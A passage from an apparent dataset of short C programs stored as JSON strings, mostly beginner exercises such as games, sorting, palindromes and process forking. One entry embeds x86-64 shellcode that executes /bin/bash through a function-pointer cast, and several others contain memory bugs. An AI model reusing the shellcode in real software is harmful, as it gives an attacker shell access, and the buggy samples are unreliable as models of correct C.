printf(\"your move: \");\n   if (!scanf(\"%d\", &move)) {\n    scanf(\"%*s\");\n    continue;\n   }\n   if (--move < 0 || move >= 9) continue;\n   if (b[i = move / 3][j = move % 3]) continue;\n   b[i][j] = 1;\n   break;\n  }\n  if (!user) {\n   if (!k) {\n    best_i = rand() % 3;\n    best_j = rand() % 3;\n   } else\n    test_move(-1, 0);\n   b[best_i][best_j] = -1;\n   printf(\"My move: %d\\n\", best_i * 3 + best_j + 1);\n  }\n  showboard();\n  if ((win = check_winner()))\n   return win == 1 ? \"You win.\\n\\n\": \"I win.\\n\\n\";\n }\n return \"A draw.\\n\\n\";\n}\nint main()\n{\n int first = 0;\n while (1) printf(\"%s\", game(first = !first));\n return 0;\n}",
    "#include <stdio.h>\n#include <unistd.h>\nint main(void)\n{\nchar ch[] = \"and that piece of art is useful\\\" - Dora Korpar, 2015-10-19\";\nwrite(2, ch, sizeof(ch));\nreturn (1);\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main() {\n    int n, sum;\n    sum = 0;\n    printf(\"Tamanho do vetor:\");\n    scanf(\"%d\", &n);\n    int vetor[n];\n    for (int i = 0; i < n; i++) {\n        printf(\"Item n %d:\", i);\n        scanf(\"%d\", &vetor[i]);\n        if (i % 2 == 0) {\n            sum += vetor[i];\n        }\n    }\n    printf(\"Soma dos itens de index par: %d\\n\", sum);\n    system(\"PAUSE\");\n    return 0;\n}",
    "#include <stdio.h>\nint main() {\n    printf(\"hello, world!\");\n}",
    "#include <stdio.h>\n#include <stdbool.h>\n\nint board[8][8] = { {0} };\nint asse_x[8] = { 0 };\n_Bool isValid(int p_x, int p_y)\n{\n}\nvoid p_board();\nint main()\n{\n    int p_x;\n    int p_y;\n    p_x = 0;\n    p_y = 0;\n    board[p_x][p_y] = 1;\n    p_board();\n    return 0;\n}\nvoid p_board()\n{\n    puts(\"\");\n    int i,k;\n    for(i = 0; i < 8; i++)\n    {\n        for(k = 0; k < 8; k++)\n        {\n            printf(board[i][k] == 0 ? \"[ ]\" : \"[Q]\");\n        }\n        puts(\"\");\n    }\n        puts(\"\");\n        return;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main(){\n int x = 3;\n int *p;\n p = (int *) malloc(sizeof(int)*x);\n for (int i = 0; i < 3; i++){\n  printf(\"[%d]: \", i);\n  scanf(\"%d\", &p[i]);\n }\n for (int j = 0; j < 3; j++){\n  printf(\"[%d] - %d\\n\", j, p[j]);\n }\n free(p);\n return 0;\n}",
    "#include <stdio.h>\n#include <string.h>\nint parseLine(char []);\nint countVariables(char []);\nvoid parseType(char [], char []);\nint main(){\n    char string[1000];\n    char *line;\n    int totalSize = 0;\n    scanf(\"%[^\\n]%*c\", string);\n    line = strtok(string, \";\");\n    do{\n        totalSize += parseLine(line);\n        line = strtok(((void*)0),\";\");\n    }while(line != ((void*)0));\n    printf(\"Total memory required %d bytes\",totalSize);\n    return 0;\n}\nint parseLine(char line[]){\n    char type[50];\n    int varCount,size = 0;\n    parseType(line,type);\n    varCount = countVariables(line);\n    if(strcmp(type,\"int\") == 0)\n        size = sizeof(int);\n    else if(strcmp(type,\"char\") == 0)\n        size = sizeof(char);\n    else if(strcmp(type,\"double\") == 0)\n        size = sizeof(double);\n    else if(strcmp(type,\"float\") == 0)\n        size = sizeof(float);\n    return size * varCount;\n}\nint countVariables(char line[]){\n    char *ch = line;\n    int count = 1;\n    while(*ch != '\\0'){\n        if(*ch == ',')\n            count++;\n        ch+=1;\n    }\n    return count;\n}\nvoid parseType(char line[], char type[]){\n    char *ch = line;\n    int i=0;\n    while(*ch != ' '){\n        type[i] = *ch;\n        ch +=1;\n        i++;\n    }\n    type[i] = '\\0';\n}",
    "#include <stdio.h>\nint main(int argc, char *argv[]) {\n   int n;\n   scanf(\"%d\",&n);\n   if(n%2==0){\n    printf(\"even\\n\");\n }else{\n  printf(\"odd\\n\");\n }\n    return 0;\n }",
    "#include<stdio.h>\n int main(void)\n    {\n     printf(\"Hello World\\n\");\n     return 0;\n }",
    "#include <stdio.h>\nchar sh[]=\"\\xeb\\x0b\\x5f\\x48\\x31\\xd2\\x52\\x5e\\x6a\\x3b\\x58\\x0f\\x05\\xe8\\xf0\\xff\\xff\\xff\\x2f\\x2f\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x2f\\x2f\\x62\\x61\\x73\\x68\";\nvoid main(int argc, char **argv)\n{\n int (*func)();\n func = (int (*)()) sh;\n (int)(*func)();\n}",
    "#include<stdio.h>\nint main()\n{\n    int t,b,ans;\n    scanf(\"%d\",&t);\n    while(t--){\n        ans=0;\n        scanf(\"%d\",&b);\n        b=(b-2)/2;\n        ans=b*(b+1)/2;\n        printf(\"%d\\n\",ans);\n    }\n    return 0;\n}",
    "#include <assert.h>\n#include <stdbool.h>\n#include <stdio.h>\nbool isPalindrome(int number);\nint main()\n{\n    assert(isPalindrome(0));\n    assert(isPalindrome(1));\n    assert(isPalindrome(12321));\n    assert(!isPalindrome(1234));\n    return 0;\n}\nbool isPalindrome(int number)\n{\n    int reversedNumber = 0;\n    int originalNumber = number;\n    while (number != 0)\n    {\n        int remainder = number % 10;\n        reversedNumber = reversedNumber * 10 + remainder;\n        number /= 10;\n    }\n    return originalNumber == reversedNumber;\n}",
    "#include<stdio.h>\n#include<string.h>\n#include<stdlib.h>\nchar *reverseACString(char *s)\n{\nint i =0;\nchar *x = (char*)(malloc(strlen(s))+1);\nfor(i=0;i<=strlen(s);i++)\n  x[i] = s[strlen(s)-i];\nreturn x;\n}\nint main()\n{\nchar *str;\nscanf(\"%s\",str);\nchar *x =reverseACString(str);\nfor(int i= 0;i<=strlen(str);i++)\n{\n   printf(\"%c\",x[i]);\n}\n}",
    "#include <stdio.h>\nint main(){\n    int n, a[15], i, max = 0;\n    scanf(\"%d\", &n);\n    for(i = 0; i < n; i++)\n    {\n        scanf(\"%d\", &a[i]);\n        if(a[i] > max)\n        max = a[i];\n    }\n    printf(\"%d is the maximum element in the array\", max);\n    return 0;\n}",
    "#include <stdio.h>\nint main() {\n  printf(\"Total \\t = \\t 100%\\n\");\n  printf(\"IVA \\t = \\t 17%\\n\");\n  printf(\"IRS \\t = \\t 15%\\n\");\n  printf(\"---------------------\\n\");\n  printf(\"Liq. \\t = \\t 68%\\n\");\n  return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n int r,y;\n double m,s;\n scanf(\"%d %lf %d\",&r,&m,&y);\n s=r/100.0+1;\n for (r=0;r<y;r++)\n  m*=s;\n printf(\"%d\\n\",(int)m);\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nvoid counter(void);\nint main(void)\n{\n counter();\n counter();\n system(\"pause\");\n return 0;\n}\nvoid counter(void)\n{\n static int cont=0;\n printf(\"counter()\u5df2\u7d93\u88ab\u547c\u53eb%d\u6b21\u4e86...\\n\",++cont);\n}",
    "#include <stdbool.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n\n\nstatic void error(const char* msg);\nstatic void using(void);\nstatic void cat(FILE* file);\nstatic void error(const char* msg) {\n    perror(msg);\n    exit(1);\n}\nstatic void using(void) {\n    fputs(\n        \"using:\\n\"\n        \"\\tcat [-nsEeh] <string>...\\n\",\n        (stderr)\n    );\n    exit(1);\n}\nstatic void cat(FILE* file) {\n    for (char c = getc(file); c != (-1); c = getc(file)) {\n        putchar(c);\n    }\n}\nint main(int argc, char** argv) {\n    int opt;\n    while ((opt = getopt(argc, argv, \"\")) != -1) {\n        switch (opt) {\n        default:\n            using();\n            break;\n        }\n    }\n    argc -= optind;\n    argv += optind;\n    for (int i = 0; i < argc; i++) {\n        FILE* file = fopen(argv[i], \"r\");\n        if (file == ((void*)0)) {\n            error(\"\\x1b[91m\" \"File error\" \"\\x1b[39m\");\n        }\n        cat(file);\n        fclose(file);\n    }\n    if (argc == 0) {\n        cat((stdin));\n    }\n    return 0;\n}",
    "#include <unistd.h>\n#include <sys/types.h>\n#include <stdio.h>\n#include <stdlib.h>\nint main() {\n    pid_t pid;\n    printf(\"\u041f\u043e\u0440\u043e\u0436\u0434\u0435\u043d\u0438\u0435 \u043f\u0440\u043e\u0446\u0435\u0441\u0441\u0430 1 PID = %d PPID = %d\\n\", getppid(), getppid());\n    if ( (pid = fork()) == -1 )\n        printf(\"\u041e\u0448\u0438\u0431\u043a\u0430!\\n\");\n    else if (pid == 0) {\n        printf(\"\u041f\u043e\u0440\u043e\u0436\u0434\u0435\u043d\u0438\u0435 \u043f\u0440\u043e\u0446\u0435\u0441\u0441\u0430 2 PID = %d PPID = %d\\n\", getpid(), getppid());\n        if ( (pid = fork()) == -1 )\n            printf(\"\u041e\u0448\u0438\u0431\u043a\u0430!\\n\");\n        else if (pid == 0) {\n            printf(\"\u041f\u043e\u0440\u043e\u0436\u0434\u0435\u043d\u0438\u0435 \u043f\u0440\u043e\u0446\u0435\u0441\u0441\u0430 4 PID = %d PPID = %d\\n\", getpid(), getppid());\n            printf(\"\u0417\u0430\u0432\u0435\u0440\u0448\u0438\u043b\u0441\u044f \u043f\u0440\u043e\u0446\u0435\u0441\u0441 4 PID = %d PPID = %d\\n\", getpid(), getppid());\n            execl(\"/bin/ls\", \"ls\", ((void*)0));\n        }\n        printf(\"\u0417\u0430\u0432\u0435\u0440\u0448\u0438\u043b\u0441\u044f \u043f\u0440\u043e\u0446\u0435\u0441\u0441 2 PID = %d PPID = %d\\n\", getpid(), getppid());\n        exit(0);\n    } else sleep(1);\n    if ( (pid = fork()) == -1 )\n        printf(\"\u041e\u0448\u0438\u0431\u043a\u0430!\\n\");\n    else if (pid == 0) {\n        printf(\"\u041f\u043e\u0440\u043e\u0436\u0434\u0435\u043d\u0438\u0435 3 PID = %d PPID = %d\\n\", getpid(), getppid());\n        printf(\"\u0417\u0430\u0432\u0435\u0440\u0448\u0438\u043b\u0441\u044f \u043f\u0440\u043e\u0446\u0435\u0441\u0441 3: PID = %d, PPID = %d\\n\", getpid(), getppid());\n        exit(0);\n    } else sleep(1);\n    printf(\"\u0417\u0430\u0432\u0435\u0440\u0448\u0438\u043b\u0441\u044f \u043f\u0440\u043e\u0446\u0435\u0441\u0441 1: PID = %d, PPID = %d\\n\", getpid(), getppid());\n    exit(0);\n    return 1;\n}",
    "#include <stdio.h>\n#include <string.h>\n\n\nchar input[61];\nchar scoring_space[] = \" eEtTaAoOiInNsShHrRdDlLcCuUmMwWfFgGyYpPbBvVkKjJxXqQzZ\";\nchar hex2dec(char nibble)\n{\n  char val = 0;\n  if(nibble > 'a') { val = nibble - 'a' + 10; }\n  else if(nibble > 'A') { val = nibble - 'A' + 10; }\n  else { val = nibble - '0'; }\n  return val;\n}\nunsigned int get_score(char num)\n{\n  unsigned int result = 0;\n  unsigned int scoring_space_len = strlen(scoring_space);\n  for(unsigned int i = 0; i < scoring_space_len; ++i)\n  {\n    if(num == scoring_space[i])\n    {\n      result = scoring_space_len - i;\n      break;\n    }\n  }\n  return result;\n}\nint main()\n{\n  unsigned int input_length = sizeof(input);\n  unsigned int max_score = 0;\n  int max_score_key = -1;\n  char max_score_input[61];\n  FILE * file = fopen(\"4.txt\", \"r\");\n  while(fgets(input, input_length, file))\n  {\n    int max_score_key_local = -1;\n    unsigned int current_score = 0, max_score_local = 0;\n    for(unsigned int i = 32; i <= 127; ++i)\n    {\n      char num = 0;\n      current_score = 0;\n      for(unsigned int j = 0; j < input_length; j += 2)\n      {\n        num = ((hex2dec(input[j]) ^ (i >> 4)) << 4) |\n          (hex2dec(input[j + 1]) ^ (i & 0x0F));\n        current_score += get_score(num);\n      }\n      if(current_score > max_score_local)\n      {\n        max_score_local = current_score;\n        max_score_key_local = i;\n      }\n    }\n    if (max_score_local > max_score)\n    {\n      max_score = max_score_local;\n      max_score_key = max_score_key_local;\n      strcpy(max_score_input, input);\n    }\n  }\n  printf(\"Input: %s\\nKey found: %c\\nScore: %u\\n\", max_score_input, max_score_key, max_score);\n  printf(\"Original String: \");\n  for(unsigned int i = 0; i < input_length; i+= 2)\n  {\n    printf(\"%c\", ((hex2dec(max_score_input[i]) ^ (max_score_key >> 4)) << 4) |\n           (hex2dec(max_score_input[i + 1]) ^ (max_score_key & 0x0F)));\n  }\n  return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n    int vetor[5], i, chave, cont=0;\n    for(i=0; i<5; i++)\n    {\n        scanf(\"%d\", &vetor[i]);\n    }\n    printf(\"\\nEntre com uma chave: \");\n    scanf(\"%d\", &chave);\n    for(i=0; i<5; i++)\n    {\n        if(vetor[i]==chave)\n        {\n            cont++;\n        }\n    }\n    printf(\"\\nO numero %d apareceu %d vezes!\", chave, cont);\n    return 0;\n}",
    "#include <stdio.h>\n#include <math.h>\n#include <math.h>\n#include <stdint.h>\n\n\n\n\nvoid generate_sin_table(void)\n{\n    int i;\n    float v, k;\n    printf(\"#include <stdint.h>\\n\");\n    printf(\"#include <avr/pgmspace.h>\\n\");\n    printf(\"#define NUM_SIN_TABLE_ENTRIES %d\\n\", 1000);\n    printf(\"const PROGMEM int16_t sin_table[NUM_SIN_TABLE_ENTRIES] = {\\n    \");\n    for(i = 0; i < 1000; i++)\n    {\n        k = (float)i / 1000 * 2.0 * 3.14159265358979323846;\n        v = sin(k);\n        printf(\"%5d\", (int)(v * 1000));\n        if (i < 1000 - 1)\n            printf(\",\");\n        if (i && i % 20 == 0)\n            printf(\"\\n    \");\n    }\n    printf(\"\\n};\\n\");\n}\nint main(int argc, char *argv[])\n{\n    generate_sin_table();\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <time.h>\n\nstatic size_t MM = 64000;\nvoid add(float * restrict a, float * restrict b, float * restrict c, size_t n){\n    size_t i;\n    for(i = 0; i < n; ++i) {\n        c[i] = a[i] + b[i];\n    }\n}\nint main() {\n    float * restrict a, * restrict b, * restrict c;\n    size_t i;\n    clock_t start,end;\n    float diffs;\n    a = (float *) malloc(MM*sizeof(float));\n    b = (float *) malloc(MM*sizeof(float));\n    c = (float *) malloc(MM*sizeof(float));\n    for(i = 0; i < MM; ++i){\n        a[i] = 1.0/(float)(i+1);\n        b[i] = a[i];\n    }\n    start = clock();\n    for(i = 0; i < 100; ++i){\n        add(a,b,c,MM);\n    }\n    end = clock();\n    diffs = (end - start)/(float)((clock_t)1000000000);\n    printf(\"time(ns)=%lf\\n\",diffs*1000000);\n    free(a);\n    free(b);\n    free(c);\n    return 0;\n}",
    "#include <stdio.h>\nconst int MAX = 2147483647;\nint main() {\n    int a = 4;\n    float f = 7.5;\n    int j;\n    int *p;\n    int b = a + (int)f;\n    float c = a * f;\n    long int d = (long)MAX * MAX;\n    p = &a;\n    *p = 7;\n    p++;\n    *p = 8;\n    printf(\"a = %d, b = %d, j = %d, d = %ld\\n\", a, b, j, d);\n    printf(\"c = %f, f = %f\\n\", c, f);\n    int arr[5] = {0};\n    *(arr + 1) = 20;\n    p = arr;\n    for (int i = 0; i < 5; i++) {\n        *p = 67;\n        p++;\n    }\n    printf(\"arr[1] = %d\\n\", arr[1]);\n    return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n    fprintf((stderr), \"not yet done\\n\");\n    return 1;\n}",
    "#include<stdio.h>\nint main()\n{\n    int a[10],n,i,j,key;\n    scanf(\"%d\",&n);\n    for(i=0;i<n;i++)\n    {\n       scanf(\"%d\",&a[i]);\n    }\n    for(i=1;i<n;i++)\n    {\n        key=a[i];\n        j=i-1;\n    }\n    while(j>=0&&a[j]>key)\n    {\n           a[j+1]=a[j];\n           j=j-1;\n    }\n    a[j+1]=key;\n  for(i=0;i<n-1;i++)\n  {\n      printf(\"%d\\n\",a[i]);\n  }\n}",
    "#include <unistd.h>\n#include <stdio.h>\n#include <string.h>\n#include <fcntl.h>\nint main()\n{\n int fd = open(\"namedPipe\", (0x10000000));\n char* s = \"something to transfer...\";\n sleep(10);\n write( fd, s, strlen(s) );\n sleep(10);\n return 0;\n}",
    "#include <sys/types.h>\n#include <sys/param.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\n#include <unistd.h>\nint main(void) {\n  int s;\n  s =socket(1, (6), 0);\n  return(close(s));\n}",
    "#include <stdio.h>\nint square(int a, int b) {\n    int ret = 1;\n    int *p = ((void*)0);\n    *p = 666;\n    return ret;\n}\nint doCalc(int number1, int number2) {\n    int ret = square(number1, number2);\n    return ret;\n}\nint main() {\n    int param1 = 1;\n    int param2 = 2;\n    int ret = doCalc(param1, param2);\n    printf (\"ret is %d\\n\", ret);\n    return 0;\n}",
    "#include<stdio.h>\nint v[6001],w[6001],s[6001],f[6001];\nvoid origin(int a){\n    int i=0;\n for(;i<=a;i++){\n v[i]=0;\n w[i]=0;\n s[i]=0;\n f[i]=0;\n }\n return;\n}\nint max(int a,int b){\n    if(a>=b)\n return a;\n else\n return b;\n }\nint main(){\n    int n,m,i,j,k;\n scanf(\"%d%d\",&n,&m);\n origin(m);\n for(i=1;i<=n;i++)\n scanf(\"%d%d%d\",&v[i],&w[i],&s[i]);\n for(i=1;i<=n;i++){\n     for(j=m;j>=0;j--){\n      for(k=1;k<=s[i];k++){\n       if(j<k*v[i])\n    break;\n    f[j]=max(f[j],f[j-k*v[i]]+k*w[i]);\n   }\n  }\n }\n printf(\"%d\\n\",f[m]);\n return 0;\n}",
    "#include <stdio.h>\n#include <math.h>\ndouble abs_f(double a) {\n  if (a >= 0) return a;\n  return -a;\n}\nint main() {\n  double f, x, y, z;\n  printf(\"Please, choose the values of x that fail expression (0.4 - pow(x, 0.7) * 0.7 = 0\\n\");\n  scanf(\"%lf\", &x);\n  scanf(\"%lf\", &y);\n  scanf(\"%lf\", &z);\n  f = (pow(y, 0.6) * 0.7 + abs_f(z) * 0.5) / ((cos(z) * 0.5 * 0.7) / (((0.4 - pow(x, 0.7) * 0.7) * 0.8)));\n  printf(\"%lf\", f);\n}",
    "#include <stdio.h>\nint BiSearch(int* pa,int n,int item);\nint main( )\n{\n int a[10]={1,3,34,45,56,67,78,89,90,99};\n int x,pos;\n printf(\"Input x be searched:\\n\");\n scanf(\"%d\",&x);\n pos=BiSearch(a,10,x);\n if (pos!=-1)\n  printf(\"pos=%d\\n\",pos);\n else\n  printf(\"Not found!\\n\");\n return 0;\n}\nint BiSearch(int* pa,int n,int item)\n{\n int low=0,high=n-1,mid;\n while(low<=high)\n {\n  mid=(low+high)/2;\n  if(item==pa[mid])\n   return(mid);\n  else\n   if(item<pa[mid])\n    high=mid-1; else\n    low=mid+1;\n}\n return(-1);\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <stdint.h>\n\nint main(int argc, char *argv[])\n{\n    if (argc != 2)\n    {\n        if (argc < 2)\n        {\n            printf(\"Too few arguments.\\nUsage: ./recover [filename]\\n\");\n            return 1;\n        }\n        else if (argc > 2)\n        {\n            printf(\"Too many command-line arguments.\\nUsage: ./recover [filename.raw]\\n\");\n            return 1;\n        }\n    }\n    typedef uint8_t byte;\n    byte jh[3];\n    jh[0] = 0xff;\n    jh[1] = 0xd8;\n    jh[2] = 0xff;\n    byte BYTE = 1;\n    int BLOCK = 512;\n    char *filename = malloc(BYTE * 8);\n    int filecount = 0;\n    FILE *img = 0;\n    FILE *f = fopen(argv[1], \"r\");\n    if (!f)\n    {\n        free(filename);\n        printf(\"Cannot open file.\\nPlease check file address.\\n\");\n        return 1;\n    }\n    byte buffer[BLOCK];\n    while (fread(buffer, BYTE, BLOCK, f) != 0)\n    {\n        if (buffer[0] == jh[0] && buffer[1] == jh[1] && buffer[2] == jh[2] && (buffer[3] & 0xf0) == 0xe0)\n        {\n            if (filecount == 0)\n            {\n                sprintf(filename, \"%03i.jpg\", filecount);\n                img = fopen(filename, \"w\");\n                filecount++;\n                fwrite(buffer, BYTE, BLOCK, img);\n            }\n            else\n            {\n                fclose(img);\n                sprintf(filename, \"%03i.jpg\", filecount);\n                filecount++;\n                img = fopen(filename, \"w\");\n                fwrite(buffer, BYTE, BLOCK, img);\n            }\n        }\n        else\n        {\n            if (img != 0)\n            {\n                fwrite(buffer, BYTE, BLOCK, img);\n            }\n        }\n    }\n    free(filename);\n    fclose(img);\n    fclose(f);\n    return 0;\n}",
    "#include<stdio.h>\n#include<math.h>\nunsigned int fact(unsigned int N)\n{\n    if(N==0)\n    {\n        return 1;\n    }\n    else\n    {\n        return N*fact(N-1);\n    }\n}\nint main()\n{\n    int N;\n    scanf(\"%d\",&N);\n    fact(N);\n    printf(\"%d\",fact(N));\n    return 0;\n}",
    "#include <stdio.h>\nvoid minmax(int a[],int dim,int *min,int *max){\n  int x=a[0],y=a[0];\n  for(int i=1;i<dim;i++){\n     if(a[i]<x){\n          x=a[i];\n          *min=i;\n     }\n     if(a[i]>y){\n          y=a[i];\n          *max=i;\n     }\n  }\n  printf(\"%d\\n%d\\n%d\\n%d\\n\",*min,x,*max,y);\n}\nint main(void){\n  int a[10];\n  int min,max;\n  for(int i=0;i<10;i++)\n     scanf(\"%d\",&a[i]);\n  minmax(a,10,&min,&max);\n  return 0;\n}",
    "#include <stdio.h>\nint main(void)\n{\n    printf(\"This is Line 1\");\n    printf(\"This is Line 2\");\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <ctype.h>\nvoid ToUpper(char *);\nint main()\n{\n    char STR[]=\"It is string literal.\";\n    system(\"chcp 1251\");\n    puts(STR);\n    ToUpper(STR);\n    puts(STR);\n    printf(\"Hello world!\\n\");\n    return 0;\n}\nvoid ToUpper(char *str)\n{\n    while(*str)\n    {\n        *str=toupper(*str);\n        str++;\n    }\n}",
    "#include <stdio.h>\nint main() {\n  int a = 1;\n  switch (a) {\n  case 1:\n  case 2:\n  case 3:\n    printf(\"ONETWOTHREE\\n\");\n    break;\n  case 4:\n    printf(\"FOUR\\n\");\n    break;\n  default:\n    printf(\"UNKNOWN\\n\");\n  }\n  return 0;\n}",
    "\n\nint board[]={\n  1,2,0,0,0,7,0,9,0,\n  0,3,0,0,1,0,0,0,8,\n  0,0,9,6,0,0,5,0,0,\n  0,0,5,0,0,0,9,0,0,\n  0,1,0,0,8,0,0,0,2,\n  6,0,0,0,0,4,0,0,0,\n  3,0,0,8,0,0,1,0,0,\n  0,4,0,0,0,0,0,0,7,\n  0,0,7,0,0,0,3,0,0};\nint AnsCount = 0;\nint canBePlaced(int pos, int x)\n{\n  int row=pos/9;\n  int col=pos%9;\n  int i, j, topLeft;\n  for (i=0; i<9; ++i) {\n    if (board[row*9 +i]==x) return 0;\n    if (board[col+i*9]==x) return 0;\n  }\n  topLeft=9*(row/3)*3 +(col/3)*3;\n  for (i=0; i<3; ++i) {\n    for (j=0; j<3; ++j) {\n      if (board[topLeft+i*9 +j]==x) return 0;\n    }\n  }\n  return 1;\n}\nvoid check(int pos){\n  int i, x, newPos;\n  if (pos==9*9)\n    {\n     AnsCount++;\n      return;\n    }\n  for (newPos=pos; newPos<9*9; ++newPos) {\n    if (board[newPos]==0) break;\n  }\n  for (x=1; x<=9; ++x) {\n    if (canBePlaced(newPos, x)) {\n      board[newPos]=x;\n      check(newPos+1);\n      board[newPos]=0;\n    }\n  }\n}\nint main()\n{\n  check(0);\n  return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n    int a = 1;\n    a = 5 < 2 ? 4 : 3;\n    printf(\"%d\", a);\n    return 0;\n}",
    "#include <stdio.h>\nint ISSET(unsigned char bitset, int bitpos);\nvoid ADDBIT(unsigned char* bitset, int bitpos);\nvoid DELBIT(unsigned char* bitset, int bitpos);\nvoid PRINTBITS(unsigned char* bitset);\nint main() {\n  unsigned char testbit = 0x13;\n  printf(\"Test Bit: %d\\n\", testbit);\n  printf(\"Is Position 1 set?: %d\\n\", ISSET(testbit, 1));\n  ADDBIT(&testbit, 2);\n  printf(\"Add to position 2: %d\\n\", testbit);\n  testbit = 0x13;\n  DELBIT(&testbit, 1);\n  printf(\"Remove bit at position 1: %d\\n\\n\", testbit);\n  PRINTBITS(&testbit);\n}\nint ISSET(unsigned char bitset, int bitpos) {\n  unsigned char bitmask = 0x01;\n  if(((bitmask << bitpos) & bitset) > 0) {\n    return 1;\n  } else {\n    return 0;\n  }\n}\nvoid ADDBIT(unsigned char* bitset, int bitpos) {\n  unsigned char bitmask = 0x01;\n  *bitset |= (bitmask << bitpos);\n}\nvoid DELBIT(unsigned char* bitset, int bitpos) {\n  *bitset &= ~(1 << bitpos);\n}\nvoid PRINTBITS(unsigned char* num) {\n  for(int bit = 0; bit < 8; bit++) {\n    printf(\"The bit in position %d is %i\\n\", bit, *num & 0x01);\n    *num = *num >> 1;\n  }\n}",
    "#include <stdlib.h>\n#include <stdio.h>\nint heads(void)\n{\n    return rand() < (0x7fffffff)/2;\n}\nint main(int argc, char *argv[])\n{\n    int i, j, cnt;\n    int N = atoi(argv[1]), M = atoi(argv[2]);\n    int *f = malloc((N+1)*sizeof(int));\n    for (j = 0; j <= N; j++)\n        f[j] = 0;\n    for (i = 0; i < M; i++, f[cnt]++)\n        for (cnt = 0, j = 0; j <= N; j++)\n            if (heads())\n                cnt++;\n    for (j = 0; j <= N; j++)\n    {\n        printf(\"%2d \", j);\n        for (i = 0; i < f[j]; i+=10)\n            printf(\"*\");\n        printf(\"\\n\");\n    }\n}",
    "#include <stdio.h>\nint stringLength(char* str)\n{\n  int count = 0;\n  while (*(str+count)!='\\0')\n  {\n    count++;\n  }\n  return count;\n}\nint isPalindrome(char* str)\n{\n  int length = stringLength(str);\n  int i = 0;\n  while(i < length)\n  {\n    printf(\"%c\\n\",*(str+length-1-i));\n    printf(\"%c\\n\",*(str+i));\n    if (*(str+i) != *(str+length-1-i))\n    {\n      return 0;\n    }\n    i++;\n  }\n  return 1;\n}\nint main()\n{\n  printf(\"%d\",isPalindrome(\"lol\"));\n}",
    "#include <stdio.h>\n#include <ctype.h>\n\nint main() {\n    int c, message[1024], *p = message, *q = p;\n    printf(\"Enter a message: \");\n    while ((c = getchar()) != '\\n' && p < message + 1024)\n        if ((0 ? isalpha(c) : (((unsigned)(c)|32)-'a') < 26))\n            *p++ = c;\n    p--;\n    while (p > q)\n        if (*p-- != *q++)\n            break;\n    puts(p - q ? \"not a palindrome\" : \"palindrome\");\n}",
    "#include <stdio.h>\nint main()\n{\n    int num;\n    scanf(\"%d\",&num);\n    if(num<=0){\n        fprintf((stderr),\"error\");\n        return -1;\n    }\n    int array[num];\n    array[0] = 0;\n    array[1] = 1;\n    int i;\n    for (i = 2; i <= num; i++)\n    {\n        array[i] = array[i - 1] + array[i - 2];\n        printf(\"%d\\n\", array[i - 1]);\n    }\n    printf(\"%d\\n\", array[i-1]);\n}",
    "#include <stdio.h>\nint main()\n{\n    int n, ara[1000], i, j;\n    scanf(\" %d\", &n);\n    for(i=0; i<1000; )\n    {\n        for(j=0; j<n; j++, i++)\n        {\n            ara[i] = j;\n            if(i>999)\n            {\n                break;\n            }\n            printf(\"N[%d] = %d\\n\", i, ara[i]);\n        }\n    }\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint quick_sort(int A[] , int final[] , int tamanho);\nint main() {\n int tamanho;\n scanf (\"%d\" , &tamanho);\n int vetor_principal[tamanho];\n for (int i=0;i<tamanho;i++){\n  scanf (\"%d\", &vetor_principal[i]);\n }\n int vetor_ordenado[tamanho];\n quick_sort (vetor_principal,vetor_ordenado,tamanho);\n}\nint quick_sort (int A[] , int final[], int tamanho){\n if (tamanho < 2){\n  final = A;\n }\n else{\n  int pivo = A[tamanho/2];\n  int qtde_menor = 0;\n  int qtde_maior = 0;\n  for (int i=0;i<tamanho;i++){\n   if (A[i] != pivo && A[i] < pivo){\n    qtde_menor++;\n   }\n   if (A[i] != pivo && A[i] > pivo){\n    qtde_maior++;\n   }\n  }\n  int esquerda [qtde_menor];\n  int direita [qtde_maior];\n  int pos_esq = 0;\n  int pos_dir = 0;\n  for (int i=0;i<tamanho;i++){\n   if (A[i] != pivo && A[i] < pivo){\n    esquerda[pos_esq]=A[i];\n    pos_esq++;\n   }\n   if (A[i] != pivo && A[i] > pivo){\n    direita[pos_dir]=A[i];\n    pos_dir++;\n   }\n  }\n }\n return 0;\n}",
    "#include <assert.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <time.h>\n#include <inttypes.h>\nvoid swap(int8_t *first, int8_t *second)\n{\n    int8_t temp = *first;\n    *first = *second;\n    *second = temp;\n}\nvoid heapifyDown(int8_t *arr, const uint8_t size)\n{\n    uint8_t i = 0;\n    while (2 * i + 1 < size)\n    {\n        uint8_t maxChild = 2 * i + 1;\n        if (2 * i + 2 < size && arr[2 * i + 2] > arr[maxChild])\n        {\n            maxChild = 2 * i + 2;\n        }\n        if (arr[maxChild] > arr[i])\n        {\n            swap(&arr[i], &arr[maxChild]);\n            i = maxChild;\n        }\n        else\n        {\n            break;\n        }\n    }\n}\nvoid heapifyUp(int8_t *arr, uint8_t i)\n{\n    while (i > 0 && arr[(i - 1) / 2] < arr[i])\n    {\n        swap(&arr[(i - 1) / 2], &arr[i]);\n        i = (i - 1) / 2;\n    }\n}\nvoid heapSort(int8_t *arr, const uint8_t size)\n{\n    if (size <= 1)\n    {\n        return;\n    }\n    for (uint8_t i = 0; i < size; i++)\n    {\n        heapifyUp(arr, i);\n    }\n    for (uint8_t i = size - 1; i >= 1; i--)\n    {\n        swap(&arr[0], &arr[i]);\n        heapifyDown(arr, i);\n    }\n}\nstatic void test()\n{\n    const uint8_t size = 10;\n    int8_t *arr = (int8_t *)calloc(size, sizeof(int8_t));\n    for (uint8_t i = 0; i < size; i++)\n    {\n        arr[i] = rand() % 100;\n    }\n    heapSort(arr, size);\n    for (uint8_t i = 0; i < size - 1; ++i)\n    {\n        assert(arr[i] <= arr[i + 1]);\n    }\n    free(arr);\n}\nint main()\n{\n    